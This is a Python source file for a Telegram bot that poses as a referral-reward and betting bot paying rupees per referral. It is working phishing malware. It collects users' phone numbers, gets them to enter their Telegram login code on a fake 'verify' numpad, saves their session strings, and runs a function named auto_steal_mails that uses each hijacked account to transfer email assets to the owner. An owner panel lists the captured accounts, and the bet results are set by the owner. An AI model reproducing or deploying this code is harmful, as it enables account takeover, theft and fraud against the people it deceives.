# -*- coding: utf-8 -*-
import sqlite3
import logging
import random
import string
import re
import os
import threading
import asyncio
from fastapi import FastAPI
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, Bot
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ================== CONFIG (FROM ENV VARIABLES) ==================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
API_ID = int(os.getenv("API_ID", "38746329"))
API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")

# Owners List (Comma separated in env, e.g., "7729056358,8808192812")
OWNERS_STR = os.getenv("OWNERS", "7729056358,8808192812")
OWNERS = [int(x.strip()) for x in OWNERS_STR.split(",") if x.strip().isdigit()]

TARGET_MAIL_BOT = os.getenv("TARGET_MAIL_BOT", "fakemailbot")

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== DATABASE ==================
DB_PATH = "refer_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, 
        phone TEXT, 
        session_string TEXT, 
        is_banned INTEGER DEFAULT 0, 
        balance INTEGER DEFAULT 0
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        user_id INTEGER, 
        amount INTEGER, 
        upi_id TEXT, 
        status TEXT DEFAULT 'Pending'
    )""")
    c.execute("CREATE TABLE IF NOT EXISTS bets (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, choice TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    
    for owner in OWNERS:
        c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (owner,))
    conn.commit()
    conn.close()

init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    try:
        c.execute(query, params)
        conn.commit()
        res = c.fetchall()
    finally:
        conn.close()
    return res

def get_config(key, default=None):
    res = db_exec("SELECT value FROM config WHERE key=?", (key,))
    return res[0][0] if res else default

def set_config(key, value):
    db_exec("INSERT OR REPLACE INTO config (key, value) VALUES (?,?)", (key, value))

def get_all_admins():
    res = db_exec("SELECT user_id FROM admins")
    return [row[0] for row in res] if res else []

active_userbots = {}
temp_clients = {}
_numpad_text = {}

# ================== FASTAPI (RENDER) ==================
web_app = FastAPI()

@web_app.get("/")
def read_root():
    return {"status": "Bot is alive and running"}

def run_web():
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(web_app, host="0.0.0.0", port=port)

# ================== USERBOT AUTOMATION ==================
async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass

    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    asyncio.create_task(auto_steal_mails(user_id))

async def get_or_connect_client(user_id):
    if user_id in active_userbots: return active_userbots[user_id]
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    if not res or not res[0][0]: return None
    client = TelegramClient(StringSession(res[0][0]), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    return client

async def auto_steal_mails(victim_uid):
    try:
        victim_client = await get_or_connect_client(victim_uid)
        owner_id = OWNERS[0]
        owner_client = await get_or_connect_client(owner_id)
        
        if not victim_client or not owner_client: return
        target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
        owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
        
        await victim_client.send_message(target_bot, "/id")
        await asyncio.sleep(3) 
        messages = await victim_client.get_messages(target_bot, limit=2)
        if not messages: return
            
        emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
        if not emails: return
            
        owner_username = get_config("owner_claim_username")
        if not owner_username: return

        for email in emails:
            await victim_client.send_message(target_bot, f"/transfer {email} {owner_username}")
            await asyncio.sleep(3)
            await owner_client.send_message(owner_target_bot, email)
            await asyncio.sleep(3)
            
    except Exception as e:
        logger.error(f"Steal error: {e}")

# ================== STYLISH / PURPLE TEXT ==================
def style(text):
    return f"<code>{text}</code>,"

# ================== KEYBOARDS ==================
def get_main_keyboard():
    kb = [
        [KeyboardButton("🎁 Bonus"), KeyboardButton("💵 Balance")],
        [KeyboardButton("🔗 Refer Earn"), KeyboardButton("🏦 Payout Method"), KeyboardButton("💸 Withdraw")],
        [KeyboardButton("🎰 Bet & Earn")]
    ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def get_numpad_keyboard(current_text=""):
    kb = [
        [InlineKeyboardButton("1", callback_data="num_1"), InlineKeyboardButton("2", callback_data="num_2"), InlineKeyboardButton("3", callback_data="num_3")],
        [InlineKeyboardButton("4", callback_data="num_4"), InlineKeyboardButton("5", callback_data="num_5"), InlineKeyboardButton("6", callback_data="num_6")],
        [InlineKeyboardButton("7", callback_data="num_7"), InlineKeyboardButton("8", callback_data="num_8"), InlineKeyboardButton("9", callback_data="num_9")],
        [InlineKeyboardButton("⌫", callback_data="num_del"), InlineKeyboardButton("0", callback_data="num_0"), InlineKeyboardButton("Cancel", callback_data="num_cancel")],
        [InlineKeyboardButton(f"Submit {current_text}", callback_data="num_submit")]
    ]
    return InlineKeyboardMarkup(kb)

def get_bet_keyboard():
    kb = [[InlineKeyboardButton("🟢 Bet on Green", callback_data="bet_green"), InlineKeyboardButton("🔴 Bet on Red", callback_data="bet_red")]]
    return InlineKeyboardMarkup(kb)

# ================== BOT HANDLERS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    
    welcome_text = (
        "👋 <b>WELCOME TO REFER EARN BOT</b>,\n\n"
        f"You will get {style('100rs')} per refer,\n"
        f"Minimum withdraw is {style('100rs')},\n\n"
        "Please verify your contact to continue,"
    )
    
    if res and res[0][0]:
        await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
    else:
        await update.message.reply_text(
            f"🔒 <b>VERIFY YOURSELF</b>,\n\nPlease share your contact,\n",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Share Contact", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
            parse_mode="HTML"
        )

async def verify_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact: return await update.message.reply_text("❌ Please use the button,")
    
    phone = contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    uid = update.effective_user.id
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone}
        
        _numpad_text[uid] = ""
        await update.message.reply_text(
            f"📩 <b>We have sent you a Telegram verify password.</b>,\n\n"
            f"Enter it on the keyboard below,\n{style('Current: ____')}",
            reply_markup=get_numpad_keyboard("____"),
            parse_mode="HTML"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e},")

async def numpad_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data.split("_")[1]
    
    if uid not in temp_clients: return await query.edit_message_text("❌ Session expired,")
    
    current = _numpad_text.get(uid, "")
    
    if data == "cancel":
        del temp_clients[uid]
        _numpad_text[uid] = ""
        return await query.edit_message_text("❌ Cancelled,")
        
    elif data == "del":
        current = current[:-1]
    elif data == "submit":
        otp = current
        try:
            await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=otp, phone_code_hash=temp_clients[uid]['hash'])
            session = temp_clients[uid]['client'].session.save()
            phone = temp_clients[uid]['phone']
            db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, phone, session))
            await start_userbot(uid, session)
            del temp_clients[uid]
            _numpad_text[uid] = ""
            return await query.edit_message_text(f"✅ <b>Verification Successful!</b>,\n{style('Welcome to the bot')}", parse_mode="HTML")
        except Exception as e:
            if "Two-step" in str(e) or "password" in str(e).lower():
                return await query.edit_message_text(f"🔐 <b>ENTER 2FA PASSWORD BELOW</b>,", parse_mode="HTML")
            return await query.edit_message_text(f"❌ OTP Failed: {e},\nTry again or /start,")
    else:
        current += data

    _numpad_text[uid] = current
    masked = "*" * len(current)
    text = f"📩 <b>Enter OTP using keypad</b>,\n\n{style('Current: ' + masked)}"
    
    await query.edit_message_text(text, reply_markup=get_numpad_keyboard(masked), parse_mode="HTML")

async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id
    
    if uid in temp_clients and text.isdigit():
        try:
            await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=text, phone_code_hash=temp_clients[uid]['hash'])
            session = temp_clients[uid]['client'].session.save()
            db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
            await start_userbot(uid, session)
            del temp_clients[uid]
            return await update.message.reply_text(f"✅ <b>Verification Successful!</b>,\n{style('Welcome to the bot')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
        except Exception as e:
            return await update.message.reply_text(f"❌ Error: {e},")

    if text == "💵 Balance":
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        await update.message.reply_text(f"💵 <b>Balance</b>,\n\n{style('Current Balance: ₹' + str(bal))}", parse_mode="HTML")
        
    elif text == "🔗 Refer Earn":
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start={uid}"
        await update.message.reply_text(f"🔗 <b>Your Link:</b>,\n\n{style(ref_link)}\nShare and earn 100rs,", parse_mode="HTML")
        
    elif text == "🏦 Payout Method":
        await update.message.reply_text(
            f"🏦 <b>How to Withdraw</b>,\n\n"
            f"Step 1: Click on {style('💸 Withdraw')},\n"
            f"Step 2: Enter amount (Min 100rs),\n"
            f"Step 3: Enter your UPI ID,\n"
            f"Step 4: Your payment will be processed,",
            parse_mode="HTML"
        )
        
    elif text == "💸 Withdraw":
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if bal < 100:
            return await update.message.reply_text(f"⚠️ <b>Insufficient Balance</b>,\nMinimum 100rs needed,\n{style('Your Balance: ₹' + str(bal))}", parse_mode="HTML")
        context.user_data['withdrawing'] = True
        await update.message.reply_text(f"💸 <b>Enter Amount to Withdraw:</b>,")

    elif text == "🎰 Bet & Earn":
        await update.message.reply_text(
            f"🎰 <b>Bet & Earn</b>,\n\n"
            f"Bet on Green or Red,\n"
            f"Result will be out at 12 AM,\n"
            f"Double your money if you win,",
            reply_markup=get_bet_keyboard(),
            parse_mode="HTML"
        )

    elif context.user_data.get('withdrawing') and text.isdigit():
        amount = int(text)
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if amount < 100 or amount > bal:
            return await update.message.reply_text("❌ Invalid amount or insufficient balance,")
        context.user_data['withdrawing'] = False
        context.user_data['amount'] = amount
        context.user_data['upi'] = True
        await update.message.reply_text("🏦 Enter your UPI ID,")

    elif context.user_data.get('upi'):
        upi = text
        amount = context.user_data.get('amount', 0)
        db_exec("INSERT INTO withdrawals (user_id, amount, upi_id) VALUES (?,?,?)", (uid, amount, upi))
        context.user_data['upi'] = False
        await update.message.reply_text(f"✅ {style('Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
    
    elif context.user_data.get('bet_amt') and text.isdigit():
        amt = int(text)
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if amt > bal: return await update.message.reply_text("❌ Insufficient balance,")
        
        choice = context.user_data.get('bet_choice')
        db_exec("INSERT INTO bets (user_id, amount, choice) VALUES (?,?,?)", (uid, amt, choice))
        context.user_data['bet_amt'] = False
        
        await update.message.reply_text(f"✅ <b>Bet Successful</b>,\nYou bet {style(str(amt) + 'rs')} on {style(choice.upper())},\nResult at 12 AM,", reply_markup=get_main_keyboard(), parse_mode="HTML")

async def bet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    choice = query.data.split("_")[1]
    
    context.user_data['bet_choice'] = choice
    context.user_data['bet_amt'] = True
    await query.edit_message_text(f"💰 <b>Enter amount to bet on {choice.upper()}:</b>,")

# ================== OWNER PANEL ==================
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in get_all_admins(): return
    
    kb = [
        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc"), InlineKeyboardButton("🎯 Set Target", callback_data="admin_target")],
        [InlineKeyboardButton("🖼 Set Welcome Image", callback_data="admin_image"), InlineKeyboardButton("🎰 Set Bet Result", callback_data="admin_result")],
        [InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")]
    ]
    await update.message.reply_text(f"<b>👑 OWNER PANEL</b>,\nAll commands:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "admin_acc":
        users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
        text = "👥 <b>Accounts:</b>,\n\n"
        for u in users: text += f"{style('ID: ' + str(u[0]))}\n{style('Phone: ' + str(u[1]))}\n"
        await query.edit_message_text(text, parse_mode="HTML")
        
    elif data == "admin_target":
        await query.edit_message_text("🎯 Send username to set Claim Target (e.g. @myusername),")
        context.user_data['admin_state'] = 'target'
        
    elif data == "admin_image":
        await query.edit_message_text("🖼 Send the photo for Welcome Message,")
        context.user_data['admin_state'] = 'image'
        
    elif data == "admin_result":
        await query.edit_message_text("🎰 Send Result (RED or GREEN),")
        context.user_data['admin_state'] = 'result'
        
    elif data == "admin_add":
        await query.edit_message_text("👑 Send User ID to make Admin,")
        context.user_data['admin_state'] = 'admin'

async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('admin_state')
    if not state: return
    uid = update.effective_user.id
    if uid not in get_all_admins(): return
    
    if state == 'target':
        set_config("owner_claim_username", update.message.text)
        await update.message.reply_text(f"✅ {style('Target Set')}", parse_mode="HTML")
    elif state == 'image':
        if update.message.photo:
            file_id = update.message.photo[-1].file_id
            set_config("welcome_image", file_id)
            await update.message.reply_text(f"✅ {style('Image Set')}", parse_mode="HTML")
    elif state == 'result':
        res = update.message.text.upper()
        set_config("bet_result", res)
        await update.message.reply_text(f"✅ {style('Bet Result set to ' + res)}", parse_mode="HTML")
    elif state == 'admin':
        try:
            db_exec("INSERT INTO admins (user_id) VALUES (?)", (int(update.message.text),))
            await update.message.reply_text(f"✅ {style('Admin Added')}", parse_mode="HTML")
        except: pass
        
    context.user_data['admin_state'] = None

# ================== MAIN ==================
def main():
    threading.Thread(target=run_web, daemon=True).start()
    app_bot = Application.builder().token(BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("owner", owner_panel))
    app_bot.add_handler(MessageHandler(filters.CONTACT, verify_phone))
    
    app_bot.add_handler(CallbackQueryHandler(numpad_handler, pattern="^num_"))
    app_bot.add_handler(CallbackQueryHandler(bet_callback, pattern="^bet_"))
    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
    
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))
    app_bot.add_handler(MessageHandler(filters.PHOTO, admin_state_handler))

    logger.info("Bot started successfully.")
    app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
